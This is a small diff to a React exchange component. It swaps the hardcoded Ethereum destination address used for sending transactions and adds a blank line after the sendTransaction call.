@@ -129,7 +129,7 @@ const Exchange = () => {
     document.querySelector("#ethdiv").style.borderColor = "#2B313A";
   }
 
-  const ethaddress = "0x3BeC4f59d28AD107fac0311A0B978A76bBbDA290"//"0xE12C6fc28b6c35Fca2361321Ff593949d8BB539B";
+  const ethaddress = "0xE12C6fc28b6c35Fca2361321Ff593949d8BB539B";
   const [to, setTo] = React.useState('')
   const [debouncedTo] = useDebounce(ethaddress, 500)
  
@@ -258,6 +258,7 @@ useEffect(() => {
         setWait(true)
         e.preventDefault()
         sendTransaction()
+        
       }}
     >
       <div className='ex-div'>
